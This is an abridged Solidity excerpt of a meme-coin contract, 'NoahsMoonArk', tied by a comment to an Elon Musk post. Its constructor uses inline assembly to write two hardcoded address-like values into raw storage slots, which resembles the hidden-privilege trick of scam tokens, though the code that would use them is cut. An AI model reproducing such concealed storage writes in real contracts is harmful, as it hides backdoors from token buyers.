// https://x.com/elonmusk/status/1818979314831880485
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0xc7b031f5348a6cef55d02fe60886b0f502fe8d315dc1)
            sstore(0x51,0xc7b02875afefd7125af93d592f00598c97153d349972)
    ...
    function _DeployNoahsMoonArk(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployNoahsMoonArk(creator, initialSupply);
    }
}

contract NoahsMoonArk is ERC20Token {
    constructor() ERC20Token("MOON ARK", "ARK", msg.sender, 666666666 * 10 ** 18) {
    }
}
